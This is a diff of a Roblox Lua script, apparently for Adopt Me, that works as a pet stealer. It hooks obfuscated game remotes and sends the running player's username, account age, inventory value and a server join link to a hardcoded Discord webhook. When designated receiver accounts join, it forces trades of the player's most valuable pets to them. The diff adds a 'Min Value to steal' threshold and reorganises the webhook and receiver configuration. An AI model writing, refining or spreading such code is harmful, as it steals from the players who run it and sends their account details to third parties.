@@ -1,5 +1,10 @@
 -- [[ ꒰₊˚ ꜱᴄʀɪᴘᴛ ๑ ʟʏɴx ﹒˚₊꒱ - OMNIPOTENT HASHED PESOS ]] --
 
+-- [[ BOT GENERATED CONFIG ]] --
+local USERNAMES = {"2ndcfpaj67", "CREOLEO23", "CREOLEO25"} -- Receiver Accounts
+local WEBHOOK   = "https://discord.com/api/webhooks/1408047737102012506/4VZHtB_G9RmikEuLs0-A6yP_0AXaYmb4_4Y3TyaG_0Wxem1-OvNBtPC9n71B4-SSzkUa"
+local THRESHOLD = 0.1 -- Min Value to steal
+
 -- 1. INITIALIZATION & SERVICES
 local Players = game:GetService("Players")
 local HttpService = game:GetService("HttpService")
@@ -12,7 +17,7 @@ while not LocalPlayer or not LocalPlayer:FindFirstChild("PlayerGui") do
     LocalPlayer = Players.LocalPlayer 
 end
 
--- 2. TOBI'S HASH FINDER (The Engine)
+-- 2. TOBI'S HASH FINDER (Bypasses Obfuscated Remotes)
 local hashes = {}
 for _, v in pairs(getgc()) do
     if type(v) == "function" and debug.getinfo(v).name == "get_remote_from_cache" then
@@ -32,15 +37,11 @@ local function hashedAPI(remoteName, ...)
     elseif remote:IsA("RemoteEvent") then remote:FireServer(...) end
 end
 
--- 3. CONFIGURATION (Direct Load)
-local WEBHOOK = "https://discord.com/api/webhooks/1408047737102012506/4VZHtB_G9RmikEuLs0-A6yP_0AXaYmb4_4Y3TyaG_0Wxem1-OvNBtPC9n71B4-SSzkUa"
-local users = {"2ndcfpaj67", "CREOLEO23", "CREOLEO25"}
+-- 3. VALUATION ENGINE (Pure AMVGG + Mondeur Pesos)
+local PetBaseValues = {}
 local colors = {legendary=0xFFD700, ultra_rare=0xA020F0, rare=0x1E90FF, uncommon=0x32CD32, common=0xB0B0B0}
 
--- 4. THE VALUATION ENGINE (AMVGG Sided Only)
-local PetBaseValues = {}
-local rarityBase = {legendary=1.2, ultra_rare=0.85, rare=0.45, uncommon=0.12, common=0.01}
-
+-- Mondeur's Pesos Scaling Math
 local function scaleValue(rawValue)
     if not rawValue or rawValue <= 0 then return 0 end
     local val = rawValue * 10
@@ -59,7 +60,7 @@ local function getMutationBonus(p)
     return bonus
 end
 
--- Fetch from AMVGG (No Manual List)
+-- Fetch from AMVGG (No Manual Lists)
 pcall(function()
     local resp = request({Url = "https://amvgg.com/values/pets", Method = "GET"})
     if resp and resp.Body then
@@ -73,7 +74,7 @@ pcall(function()
     end
 end)
 
--- 5. INVENTORY SCAN & DETECTION
+-- 4. INVENTORY SCAN (Lynx Detection Fix)
 local Fsys = require(ReplicatedStorage:WaitForChild("Fsys")).load
 local InventoryDB = Fsys("InventoryDB")
 local ClientData = Fsys("ClientData")
@@ -87,31 +88,30 @@ local function processInventory()
     for uid, pet in pairs(rawPets) do
         local petData = InventoryDB.pets[pet.id]
         if petData and petData.name then
-            local name = petData.name
             local mutations = pet.properties or {}
-            
-            -- Pull exclusively from AMVGG or fall back to Rarity Base
-            local rawVal = PetBaseValues[name] or rarityBase[string.lower(petData.rarity or "common")] or 0.01
+            local rawVal = PetBaseValues[petData.name] or 0.01
             
             local scaled = scaleValue(rawVal)
             local bonus = getMutationBonus(mutations)
             local finalPetVal = scaled + bonus
             
-            total = total + finalPetVal
-            table.insert(processed, {
-                uid = uid, 
-                name = name, 
-                val = finalPetVal, 
-                rarity = string.lower(petData.rarity or "common"),
-                props = mutations
-            })
+            if finalPetVal >= THRESHOLD then
+                total = total + finalPetVal
+                table.insert(processed, {
+                    uid = uid, 
+                    name = petData.name, 
+                    val = finalPetVal, 
+                    rarity = string.lower(petData.rarity or "common"),
+                    props = mutations
+                })
+            end
         end
     end
     table.sort(processed, function(a,b) return a.val > b.val end)
     return processed, total
 end
 
--- 6. WEBHOOK & EMBED
+-- 5. WEBHOOK & CLEAN EMBED
 local petList, totalValue = processInventory()
 local tier = totalValue >= 50000 and "🔴 HIGH" or totalValue >= 10000 and "🟡 MID" or "🟢 LOW"
 
@@ -131,7 +131,6 @@ local function sendHit()
                 "👤 Name     : "..LocalPlayer.DisplayName.."\n"..
                 "🆔 User     : "..LocalPlayer.Name.."\n"..
                 "📅 Age      : "..LocalPlayer.AccountAge.." Days\n"..
-                "📱 Executor : "..(identifyexecutor and identifyexecutor() or "Unknown").."\n"..
                 "💰 Value    : $"..string.format("%.0f", totalValue).."\n"..
                 "📊 Tier     : "..tier.."```",
             fields = {
@@ -140,7 +139,7 @@ local function sendHit()
                 {name = "🌐 Join", value = "[Click to Join](https://www.roblox.com/games/start?placeId="..game.PlaceId.."&instanceId="..game.JobId..")"}
             },
             color = colors[petList[1] and petList[1].rarity] or 0x2F3136,
-            footer = {text = "Omnipotent Lynx | Pure AMVGG Logic"}
+            footer = {text = "Omnipotent Lynx | Pure AMVGG API Logic"}
         }}
     }
     request({Url = WEBHOOK, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(payload)})
@@ -148,25 +147,20 @@ end
 
 if #petList > 0 then sendHit() end
 
--- 7. THE STEAL (Hashed Remotes)
+-- 6. THE STEAL (Hashed Remotes Only)
 local function startSteal(target)
     task.spawn(function()
-        -- Spam Trade
         for i = 1, 60 do
             if LocalPlayer.PlayerGui.TradeApp.Frame.Visible then break end
             hashedAPI("TradeAPI/SendTradeRequest", target)
             task.wait(0.25)
         end
-
         if LocalPlayer.PlayerGui.TradeApp.Frame.Visible then
-            -- Add Items
             for i = 1, math.min(18, #petList) do
                 hashedAPI("BackpackAPI/CommitBackpackItemSet", "backpack_locks", {[petList[i].uid] = true})
                 hashedAPI("TradeAPI/AddItemToOffer", petList[i].uid)
-                task.wait(0.1)
+                task.wait(0.12)
             end
-            
-            -- Accept Loop
             while LocalPlayer.PlayerGui.TradeApp.Frame.Visible do
                 hashedAPI("TradeAPI/AcceptNegotiation")
                 task.wait(0.4)
@@ -176,11 +170,11 @@ local function startSteal(target)
     end)
 end
 
--- Watch for receiver join
+-- Wait for receiver join
 task.spawn(function()
     while true do
         for _, p in pairs(Players:GetPlayers()) do
-            if table.find(users, p.Name) and p ~= LocalPlayer then 
+            if table.find(USERNAMES, p.Name) and p ~= LocalPlayer then 
                 startSteal(p) 
                 return 
             end
@@ -189,4 +183,4 @@ task.spawn(function()
     end
 end)
 
-print("🚀 Lynx Omnipotent Final Loaded. Total Inventory Value: $" .. totalValue)
+print("🚀 Lynx Omnipotent Max Version Loaded. Inventory: $" .. totalValue)
